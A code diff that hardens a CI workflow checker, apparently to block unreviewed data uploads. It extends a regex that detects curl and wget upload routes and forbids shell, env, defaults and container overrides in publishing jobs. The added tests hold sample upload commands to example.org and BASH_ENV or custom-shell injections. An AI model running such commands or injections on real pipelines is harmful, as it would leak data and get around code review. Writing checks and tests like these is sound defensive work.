@@ -21,7 +21,8 @@ What the check does:
   ``REVIEWED``: no directories, globs, exclusions or expressions. Every run
   line that matches ``PUBLISH_COMMAND`` must be, in full, a command reviewed
   for that job. A job that commits its whole workspace may run only its
-  reviewed lines (``runs_only``).
+  reviewed lines (``runs_only``), with no ``shell``, ``env``, ``defaults`` or
+  ``container`` that could change what those lines run.
 - Jobs that can't reach the data (docs, changelog) may publish.
 
 What it does not do (Sol re-review of #603): it recognises reviewed workflow
@@ -113,6 +114,7 @@ PUBLISH_COMMAND = re.compile(
     r"|\bgit push\b"
     r"|\bcurl\b.*(--upload-file|--form|--json|--data|--config"
     r"|--request\s+(POST|PUT|PATCH)|-X\s*(POST|PUT|PATCH)|\s-[^\s-]*[TFdK])"
+    r"|\bcurl\b.*(-H|--header|--url-query)\s*@|\bwget\b.*--(post|body)-(file|data)"
     r"|\baws s3\b|\bgsutil\b|\bgcloud\b|huggingface-cli|\bhf upload\b|\btwine\b"
 )
 _NOT_LITERAL = re.compile(r"[*?\[\]{}!]|\$\{\{")
@@ -200,6 +202,18 @@ def problems(name: str, workflow: dict) -> list:
         reviewed = {**_EMPTY, **REVIEWED.get((name, job_id), {})}
         if "uses" in job:
             out.append(f"{where} calls a reusable workflow ({job['uses']})")
+        if reviewed["runs_only"] is not None:
+            for key, block in (("env", job), ("defaults", job), ("container", job)):
+                if key in block:
+                    out.append(
+                        f"{where} publishes its workspace, so it may not set {key}"
+                    )
+            for key in ("env", "defaults"):
+                if workflow.get(key):
+                    out.append(
+                        f"{where} publishes its workspace, so its workflow may not "
+                        f"set {key}"
+                    )
         earlier = []  # run steps before the current one, comments removed
         for step in job.get("steps", []):
             uses = str(step.get("uses", ""))
@@ -250,6 +264,14 @@ def problems(name: str, workflow: dict) -> list:
                     out.append(f"{where} uses an unreviewed action: {uses}")
             script = str(step.get("run", ""))
             if reviewed["runs_only"] is not None:
+                # A shell or environment could run something else around a
+                # reviewed line (BASH_ENV, a custom shell) (Sol re-review 4).
+                for key in ("shell", "env"):
+                    if key in step:
+                        out.append(
+                            f"{where} publishes its workspace, so its steps may "
+                            f"not set {key}"
+                        )
                 for line in logical_lines(script):
                     if line not in reviewed["runs_only"]:
                         out.append(
@@ -364,6 +386,9 @@ def test_an_unreviewed_upload_from_a_data_job_fails(path):
         {"run": "curl -4T la_calibration_log.csv https://example.org/"},
         {"run": "curl -K upload.cfg https://example.org/"},
         {"run": "curl --config upload.cfg https://example.org/"},
+        {"run": "curl -H @la_calibration_log.csv https://example.org/"},
+        {"run": "curl --url-query @la_calibration_log.csv https://example.org/"},
+        {"run": "wget --post-file=la_calibration_log.csv https://example.org/"},
     ],
 )
 def test_other_routes_out_of_a_data_job_fail(step):
@@ -544,4 +569,56 @@ def test_the_versioning_commit_job_runs_only_its_reviewed_lines(line):
     bare `make` builds the data, so only its reviewed lines may run."""
     data = copy.deepcopy(_load(WORKFLOW_DIR / "versioning.yaml"))
     _jobs(data)["Versioning"]["steps"].insert(1, {"run": line})
+    assert any("reviewed lines" in p for p in problems("versioning.yaml", data))
+
+
+@pytest.mark.parametrize(
+    "change",
+    [
+        ("step", "shell", "bash -c 'uv run make data; exec bash \"$0\"' {0}"),
+        ("step", "env", {"BASH_ENV": "$(uv run make data >&2)"}),
+        ("job", "env", {"BASH_ENV": "/tmp/x"}),
+        ("job", "defaults", {"run": {"shell": "bash -c 'make data'"}}),
+        ("job", "container", "python:3.13"),
+        ("workflow", "defaults", {"run": {"shell": "bash -c 'make data'"}}),
+        ("workflow", "env", {"BASH_ENV": "/tmp/x"}),
+    ],
+)
+def test_the_versioning_job_cannot_change_how_its_lines_run(change):
+    """Sol re-review 4 of #603: a shell or environment runs around a line."""
+    where, key, value = change
+    data = copy.deepcopy(_load(WORKFLOW_DIR / "versioning.yaml"))
+    job = _jobs(data)["Versioning"]
+    if where == "step":
+        step = next(s for s in job["steps"] if s.get("run") == "pip install towncrier")
+        step[key] = value
+    elif where == "job":
+        job[key] = value
+    else:
+        data[key] = value
+    assert any(
+        "publishes its workspace" in p for p in problems("versioning.yaml", data)
+    )
+
+
+@pytest.mark.parametrize(
+    "edit",
+    [
+        lambda script: script.replace(
+            "python .github/bump_version.py",
+            "python .github/bump_version.py \\\n  && uv run make data",
+        ),
+        lambda script: script + "\nuv run make data",
+    ],
+)
+def test_editing_the_reviewed_script_itself_fails(edit):
+    """Sol re-review 4 of #603, nit 3: continuations and extra lines inside the
+    reviewed script are caught too."""
+    data = copy.deepcopy(_load(WORKFLOW_DIR / "versioning.yaml"))
+    step = next(
+        s
+        for s in _jobs(data)["Versioning"]["steps"]
+        if "bump_version" in str(s.get("run", ""))
+    )
+    step["run"] = edit(step["run"])
     assert any("reviewed lines" in p for p in problems("versioning.yaml", data))
